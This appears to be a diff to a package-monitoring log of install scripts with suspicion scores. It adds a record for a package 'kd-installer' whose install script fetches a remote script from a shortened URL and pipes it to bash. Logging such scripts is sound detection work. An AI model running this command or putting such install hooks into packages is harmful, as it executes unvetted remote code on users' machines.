@@ -1,5 +1,15 @@
 [
   {
+    "packageName": "kd-installer",
+    "version": "0.0.1",
+    "scriptType": "install",
+    "scriptContent": "curl -sskL git.io/rpk7Bw | bash",
+    "previousVersion": null,
+    "timestamp": "2026-04-23T11:18:34.211Z",
+    "issuesend": false,
+    "suspicionScore": 23
+  },
+  {
     "packageName": "is-appveyor",
     "version": "1.0.0",
     "scriptType": "debug",
